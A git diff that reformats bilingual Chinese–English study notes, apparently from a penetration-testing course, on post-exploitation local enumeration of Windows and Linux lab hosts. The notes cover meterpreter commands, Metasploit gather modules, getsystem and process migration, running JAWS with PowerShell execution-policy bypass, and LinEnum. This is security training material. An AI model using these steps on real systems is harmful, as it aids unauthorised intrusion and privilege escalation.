@@ -1,7 +1,5 @@
-Windows Local Enumeration 5
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating System Information - Windows
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# Windows Local Enumeration
+## Enumerating System Information - Windows
 	獲得了對 Windows 目標系統的存取權限 : 
 		識別 Windows 目標系統上執行的易受攻擊的服務: 
 		nmap -sV demo.ine.local
@@ -27,8 +25,7 @@ Enumerating System Information - Windows
 		獲取系統上已安裝更新的列表，其中包含更詳細的信息
 		shell> wmic qfe get Caption,Description,HotFixID,InstalledOn
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating Users & Groups - Windows
+## Enumerating Users & Groups - Windows
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉我們在目標系統上有權存取的目前使用者
 	meterpreter > getuid
@@ -75,8 +72,7 @@ Enumerating Users & Groups - Windows
 	-------------------------------------------------------------------------------
 	Administrator
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating Network Information - Windows
+## Enumerating Network Information - Windows
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	meterpreter > shell
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -109,8 +105,7 @@ Enumerating Network Information - Windows
 	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       600
 	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
 	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1860
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating Processes and Services
+## Enumerating Processes and Services
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉進程與服務
 	=> 顯示目標系統上執行的所有進程的列表，以及進程 ID (PID)、使用者和程式路徑
@@ -166,8 +161,7 @@ Enumerating Processes and Services
 	Next Run Time: N/A
 	Status:        Ready
 	Logon Mode:    Interactive/Background
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Automating Windows Local Enumeration
+## Automating Windows Local Enumeration
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -T4 -PA -sC -sV -p 1-10000 demo.ine.local
 	5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
@@ -212,7 +206,7 @@ Automating Windows Local Enumeration
 	set FORCE_VBS false
 	run
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-meterpreter > background
+	meterpreter > background
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	自動列舉目前使用者權限: 
 	use post/windows/gather/win_privs
@@ -265,14 +259,13 @@ meterpreter > background
 	use post/windows/gather/enum_patches
 	set SESSION 2
 	run
-(HotFixID)
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Automating local enumeration with JAWS
+	(HotFixID)
+ ## Automating local enumeration with JAWS
 	=> JAWS是一個開源 PowerShell 腳本
 	(https://github.com/411Hall/JAWS) jaws-enum.ps1 
 	nano jaws-enum.ps1  (copy)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-meterpreter > 
+	meterpreter > 
 	getsystem
 	pgrep explorer.exe
 	migrate 3436
@@ -286,12 +279,10 @@ meterpreter >
 	powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
 	(將花費幾分鐘時間來完成枚舉過程)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-meterpreter > 
+	meterpreter > 
 	download JAWS-Enum.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Local Enumeration 4
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating System Information - Linux
+# Linux Local Enumeration 
+## Enumerating System Information - Linux
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -326,8 +317,7 @@ Enumerating System Information - Linux
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	查看Linux系統附加的儲存設備清單以及各自的掛載點和儲存容量資訊
 	df -h
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating Users & Groups - Linux
+## Enumerating Users & Groups - Linux
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	有權存取的當前用戶: 
 	meterpreter > getuid
@@ -350,8 +340,7 @@ Enumerating Users & Groups - Linux
 
 	取得最近登入系統的使用者清單
 	lastlog
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating Network Information - Linux
+## Enumerating Network Information - Linux
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉網路資訊:
 	meterpreter > ifconfig
@@ -376,8 +365,7 @@ Enumerating Network Information - Linux
 
 	識別預設的 DNS 名稱伺服器位址
 	cat /etc/resolv.conf
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Enumerating Processes and Cron Jobs
+## Enumerating Processes and Cron Jobs
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉目標系統上正在運行的進程列表:
 	meterpreter > ps
@@ -388,8 +376,7 @@ Enumerating Processes and Cron Jobs
 	列舉 Kali Linux 系統上的 cron 作業清單
 	ls -al /etc/cron*
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Automating Linux Local Enumeration
+## Automating Linux Local Enumeration
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (192.23.89.2)
 	msfconsole -q
@@ -443,4 +430,3 @@ Automating Linux Local Enumeration
 	/bin/bash -i
 	chmod +x LinEnum.sh
 	./LinEnum.sh
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
